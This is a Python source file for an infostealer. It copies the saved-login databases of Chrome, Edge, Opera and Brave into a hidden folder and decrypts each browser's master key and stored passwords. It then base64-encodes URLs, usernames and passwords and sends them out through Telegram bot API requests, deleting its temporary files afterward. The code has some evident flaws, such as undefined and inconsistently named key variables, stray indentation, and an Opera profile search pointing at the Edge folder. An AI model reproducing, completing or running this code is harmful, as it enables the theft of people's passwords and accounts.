import base64
import glob
import json
import os
import shutil
import sqlite3
from sqlite3 import Connection, Cursor
from shadowcopy import shadow_copy
import requests
import win32api
import win32con
import win32crypt
from Cryptodome.Cipher import AES


# Global Variables
app_data_dr = os.environ['LOCALAPPDATA']
app_data_dr_r = os.environ['APPDATA']
users_dr = os.environ['USERPROFILE']
vbs_dir = os.path.join(users_dr, ".vbsfiles")
CRDS_Chr = []
CRDS_Edge = []
CRDS_Opera = []
CRDS_Brave = []

# Hidden Dummy Path
if not os.path.exists(vbs_dir):
    os.mkdir(vbs_dir)
    win32api.SetFileAttributes(vbs_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
elif os.path.exists(vbs_dir):
    shutil.rmtree(vbs_dir)
    os.mkdir(vbs_dir)
    win32api.SetFileAttributes(vbs_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
os.chdir(vbs_dir)

# Chrome Paths
user_data_chr = r"Google\Chrome\User Data"
key_chr = r"Google\Chrome\User Data\Local State"

chrome_path_key = os.path.join(app_data_dr, key_chr)

chrome_path_user_data = os.path.join(app_data_dr, user_data_chr)

# Edge Paths
user_data_edge = r"Microsoft\Edge\User Data"
key_edge = r"Microsoft\Edge\User Data\Local State"

edge_path_key = os.path.join(app_data_dr, key_edge)

edge_path_user_data = os.path.join(app_data_dr, user_data_edge)

# Opera Paths
user_data_opera = r"Opera Software\Opera Stable"
key_opera = r"Opera Software\Opera Stable\Local State"

opera_path_key = os.path.join(app_data_dr_r, key_opera)

opera_path_user_data = os.path.join(app_data_dr_r, user_data_opera)

# Brave Paths
user_data_brave = r"BraveSoftware\Brave-Browser\User Data"
key_brave = r"BraveSoftware\Brave-Browser\User Data\Local State"

brave_path_key = os.path.join(app_data_dr, key_brave)

brave_path_user_data = os.path.join(app_data_dr, user_data_brave)

# Chrome Stealer
profiles_chr = glob.glob(os.path.join(chrome_path_user_data, 'Default*/')) + glob.glob(
    os.path.join(chrome_path_user_data, 'Profile*/'))


def chrome():

    global chr_state
    chr_state = False

    # Copying Login Data Of Different Profiles
    for profile in profiles_chr:
        login_data = os.path.join(profile, 'Login Data')
        if os.path.exists(login_data):
            profile_enc = base64.b64encode(bytes(profile, 'utf-8'))
            profile_enc = profile_enc.decode('utf-8')
            shadow_copy(login_data, f"{profile_enc}.db")

        # Using Sqlite Browser To Browse The DB
        conn: Connection = sqlite3.connect(f"{profile_enc}.db")
        cursor: Cursor = conn.cursor()

        # Extracting Encryption Key
        with open(chrome_path_key, 'r', encoding='utf-8') as chrome_key:
            os_crypt = json.load(chrome_key)
            chrome_key.close()
        encryption_key = base64.b64decode(os_crypt['os_crypt']['encrypted_key'])
        encryption_key = encryption_key[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

        # Navigating The DB
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            usernames = login[1]
            ciphertext = login[2]

            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(encryption_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password).decode()

            CRDS_Chr.append({'Url': url, 'Username': usernames, 'Password': decrypted_pass})

        # Writing Extracted Data To TXT File
        fn_chr = base64.b64encode(bytes("Creds_Chrome", 'utf-8')).decode('utf-8')
        with open(f"{fn_chr}.txt", 'w') as CredsF:
            for Creds in CRDS_Chr:
                encoded_url = base64.b64encode(f"URL: {Creds['Url']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_url}\n")
                encoded_username = base64.b64encode(f"Username: {Creds['Username']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_username}\n")
                encoded_password = base64.b64encode(f"Password: {Creds['Password']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_password}\n")
            CredsF.close()

        # Closing The Sqlite Browser And Deleting The DB
        cursor.close()
        conn.close()
        os.remove(f"{profile_enc}.db")

    s = requests.Session()
    with open(f"{fn_chr}.txt", 'r') as Creds:
        lines = [line.rstrip('\n') for line in Creds.readlines() if line.rstrip('\n')]
    if lines:
        chunks = [lines[i:i + 3] for i in range(0, len(lines), 3)]
        for chunk in chunks:
            s.request('GET',
                      f'https://api.telegram.org/bot{API_KEY}/sendmessage?chat_id={Chat_Id}&text=Chrome: "{chunk}"')

    chr_state = True
    os.remove(f"{fn_chr}.txt")


 chrome()

# Edge Stealer
profiles_edge = glob.glob(os.path.join(edge_path_user_data, 'Default*/')) + glob.glob(
    os.path.join(edge_path_user_data, 'Profile*/'))


def edge():

    global edge_state
    edge_state = False

    for profile in profiles_edge:
        login_data_edge = os.path.join(profile, 'Login Data')
        if os.path.exists(login_data_edge):
            profile_enc = base64.b64encode(bytes(profile, 'utf-8'))
            profile_enc = profile_enc.decode('utf-8')
            shadow_copy(login_data_edge, f"{profile_enc}.db")

            conn: Connection = sqlite3.connect(f"{profile_enc}.db")
            cursor: Cursor = conn.cursor()

        with open(edge_path_key, 'r', encoding='utf-8') as edge_key:
            os_crypt = json.load(edge_key)
            edge_key.close()
        encryption_key = base64.b64decode(os_crypt['os_crypt']['encrypted_key'])
        encryption_key = encryption_key[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            usernames = login[1]
            ciphertext = login[2]
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(encryption_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password).decode()

            CRDS_Edge.append({'Url': url, 'Username': usernames, 'Password': decrypted_pass})

            # Writing Extracted Data To TXT File
        fn_edge = base64.b64encode(bytes("Creds_Edge", 'utf-8')).decode('utf-8')
        with open(f"{fn_edge}.txt", 'w') as CredsF:
            for Creds in CRDS_Edge:
                encoded_url = base64.b64encode(f"URL: {Creds['Url']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_url}\n")
                encoded_username = base64.b64encode(f"Username: {Creds['Username']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_username}\n")
                encoded_password = base64.b64encode(f"Password: {Creds['Password']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_password}\n")
            CredsF.close()

        cursor.close()
        conn.close()
        os.remove(f"{profile_enc}.db")

    s = requests.Session()
    with open(f"{fn_edge}.txt", 'r') as Creds:
        lines = [line.rstrip('\n') for line in Creds.readlines() if line.rstrip('\n')]
    if lines:
        chunks = [lines[i:i + 3] for i in range(0, len(lines), 3)]
        for chunk in chunks:
            s.request('GET',
                      f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={Chat_Id}&text=Edge: "{chunk}"')

    edge_state = True
    os.remove(f"{fn_edge}.txt")


 edge()

# Opera Stealer
profiles_opera = glob.glob(os.path.join(opera_path_user_data, 'Default*/')) + glob.glob(
    os.path.join(edge_path_user_data, 'Profile*/')
)


def opera():

    global opera_state
    opera_state = False

    for profile in profiles_opera:
        login_data_opera = os.path.join(profile, 'Login Data')
        if os.path.exists(login_data_opera):
            profile_enc = base64.b64encode(bytes(profile, 'utf-8'))
            profile_enc = profile_enc.decode('utf-8')
            shadow_copy(login_data_opera, f"{profile_enc}.db")

            conn: Connection = sqlite3.connect(f"{profile_enc}.db")
            cursor: Cursor = conn.cursor()

        with open(opera_path_key, 'r', encoding='utf-8') as opera_key:
            os_crypt = json.load(opera_key)
            opera_key.close()
        encryption_key = base64.b64decode(os_crypt['os_crypt']['encrypted_key'])
        encryption_key = encryption_key[5:]
        encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            usernames = login[1]
            ciphertext = login[2]
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(encryption_key, AES.MODE_GCM, initialisation_vector)
            if len(encrypted_password) >= 8:
                decrypted_pass = cipher.decrypt(encrypted_password).decode()

            CRDS_Opera.append({'Url': url, 'Username': usernames, 'Password': decrypted_pass})

        fn_opera = base64.b64encode(bytes("Creds_Opera", 'utf-8')).decode('utf-8')
        with open(f"{fn_opera}.txt", 'w') as CredsF:
            for Creds in CRDS_Opera:
                encoded_url = base64.b64encode(f"URL: {Creds['Url']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_url}\n")
                encoded_username = base64.b64encode(f"Username: {Creds['Username']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_username}\n")
                encoded_password = base64.b64encode(f"Password: {Creds['Password']}".encode('utf-8')).decode('utf-8')
                CredsF.write(f"{encoded_password}\n")
            CredsF.close()

        cursor.close()
        conn.close()
        os.remove(f"{profile_enc}.db")

    s = requests.Session()
    with open(f"{fn_opera}.txt", 'r') as Creds:
        lines = [line.rstrip('\n') for line in Creds.readlines() if line.rstrip('\n')]
    if lines:
        chunks = [lines[i:i + 3] for i in range(0, len(lines), 3)]
        for chunk in chunks:
            s.request('GET',
                      f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={Chat_Id}&text=Opera: "{chunk}"')

    opera_state = True
    os.remove(f"{fn_opera}.txt")


 opera()

# Profiles Brave
profiles_brave = glob.glob(os.path.join(brave_path_user_data, 'Default*/')) + glob.glob(
    os.path.join(brave_path_user_data, 'Profile*/')
)


# Brave Stealer
def brave():
    
    global brave_state
    brave_state = False

    for profile in profiles_brave:
        login_data_brave = os.path.join(profile, 'Login Data')
        if os.path.exists(login_data_brave):
            profile_enc = base64.b64encode(bytes(profile, 'utf-8'))
            profile_enc = profile_enc.decode('utf-8')
            shadow_copy(login_data_brave, f"{profile_enc}.db")

            conn: Connection = sqlite3.connect(f"{profile_enc}.db")
            cursor: Cursor = conn.cursor()

            with open(brave_path_key, 'r', encoding='utf-8') as brave_key:
                os_crypt = json.load(brave_key)
                brave_key.close()
            encryption_key = base64.b64decode(os_crypt['os_crypt']['encrypted_key'])
            encryption_key = encryption_key[5:]
            encryption_key = win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for index, login in enumerate(cursor.fetchall()):
                url = login[0]
                usernames = login[1]
                ciphertext = login[2]
                initialisation_vector = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                cipher = AES.new(encryption_key, AES.MODE_GCM, initialisation_vector)
                decrypted_pass = cipher.decrypt(encrypted_password).decode()

                CRDS_Brave.append({'Url': url, 'Username': usernames, 'Password': decrypted_pass})

            fn_brave = base64.b64encode(bytes("Creds_Brave", 'utf-8')).decode('utf-8')
            with open(f"{fn_brave}.txt", 'w') as CredsF:
                for Creds in CRDS_Brave:
                    encoded_url = base64.b64encode(f"URL: {Creds['Url']}".encode('utf-8')).decode('utf-8')
                    CredsF.write(f"{encoded_url}\n")
                    encoded_username = base64.b64encode(f"Username: {Creds['Username']}".encode('utf-8')).decode(
                        'utf-8')
                    CredsF.write(f"{encoded_username}\n")
                    encoded_password = base64.b64encode(f"Password: {Creds['Password']}".encode('utf-8')).decode(
                        'utf-8')
                    CredsF.write(f"{encoded_password}\n")
                CredsF.close()

            cursor.close()
            conn.close()
            os.remove(f"{profile_enc}.db")
    s = requests.Session()
    with open(f"{fn_brave}.txt", 'r') as Creds:
        lines = [line.rstrip('\n') for line in Creds.readlines() if line.rstrip('\n')]
    if lines:
        chunks = [lines[i:i + 3] for i in range(0, len(lines), 3)]
        for chunk in chunks:
            s.request('GET',
                      f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={Chat_Id}&text=Brave: "{chunk}"')

    brave_state = True
    os.remove(f"{fn_brave}.txt")


 brave()


